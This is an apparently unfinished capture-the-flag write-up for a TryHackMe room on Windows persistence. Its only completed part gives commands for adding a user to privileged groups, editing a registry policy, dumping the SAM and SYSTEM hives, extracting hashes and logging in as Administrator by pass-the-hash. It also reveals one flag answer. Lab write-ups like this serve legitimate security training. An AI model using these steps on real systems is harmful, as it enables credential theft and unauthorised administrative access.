![Windows Local Persistence Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowslocalpersistence/Windows_Local_Persistence_Cover.png" alt="Windows Local Persistence Logo">
</p>

# Windows Local Persistence

This guide contains the answer and steps necessary to get to them for the [Windows Local Persistence](https://tryhackme.com/r/room/windowslocalpersistence) room.

## Table of contents

- [Tampering With Unprivileged Accounts](#tampering-with-unprivileged-accounts)
- [Backdooring Files](#backdooring-files)
- [Abusing Services](#abusing-services)
- [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
- [Logon Triggered Persistence](#logon-triggered-persistence)
- [Backdooring the Login Screen / RDP](#backdooring-the-login-screen-/-rdp)
- [Persisting Through Existing Services](#persisting-through-existing-services)

### Tampering With Unprivileged Accounts

1. Insert flag1 here

   The first thing we need to do, is add the thmuser1 to the "Backup Operators" and the "Remote Management Users" groups. This can be done through the Administrator account.

   ```console
   net localgroup "Backup Operators" thmuser1 /add
   
   net localgroup "Remote Management Users" thmuser1 /add
   ```

   TAMPERING ADD USER

   We also need to disable the LocalAccountTokenFilterPolicy.

   ```console
   reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
   ```

   TAMPERING CHANGE POLICY

   Now we have access to the SAM and SYSTEM files. Lets export them from the registry and download them to our machine.

   ```console
   reg save hklm\system system.bak
   reg save hklm\sam sam.bak

   download system.bak
   download sam.bak
   ```

   TAMPERING DOWNLOAD

   After downloading, we can use the `secretsdump.py` file to dump the hashes from the hives.

   ```console
   python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
   ```

   With the found Administrator hash (only the last part), we can use a pass-the-hash method to login withn WinRM.

   ```console
   evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
   ```

   Success! Now we can execute the flag file.

   TAMPERING FLAG1

   ><details><summary>Click for answer</summary>THM{FLAG_BACKED_UP!}</details>

2. Insert flag2 here

   First, we add the required privileges (SeBackupPrivilege and SeRestorePrivilege) to the account through the Administrator account.

   ```console
   secedit /export /cfg config.ini
   ```

   TAMPERING CONFIG

   Now we must load this configuration back into the system.

   ```console
   secedit /import /cfg config.ini /db config.db
   secedit /configure /db config.db /cfg config.ini
   ```

   Lastly, we change the descriptor for WinRM so the user can use it. Add the user and make sure it has full control.

   ```console
   Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
   ```

   TAMPERING DESCRIPTOR

   After having done that, we can login with this user and export and dump the hashes from the accounts as done in the previous question.

   Now login with the obtained Administrator hash.

   

   ><details><summary>Click for answer</summary></details>

3. Insert flag3 here



   ><details><summary>Click for answer</summary></details>

### Backdooring Files

1. Insert flag5 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag6 here



   ><details><summary>Click for answer</summary></details>

### Abusing Services

1. Insert flag7 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag8 here



   ><details><summary>Click for answer</summary></details>

### Abusing Scheduled Tasks

1. Insert flag9 here



   ><details><summary>Click for answer</summary></details>

### Logon Triggered Persistence

1. Insert flag10 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag11 here



   ><details><summary>Click for answer</summary></details>

3. Insert flag12 here



   ><details><summary>Click for answer</summary></details>

4. Insert flag13 here



   ><details><summary>Click for answer</summary></details>

### Backdooring the Login Screen / RDP

1. Insert flag14 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag15 here



   ><details><summary>Click for answer</summary></details>

### Persisting Through Existing Services

1. Insert flag16 here



   ><details><summary>Click for answer</summary></details>

2. Insert flag17 here



   ><details><summary>Click for answer</summary></details>

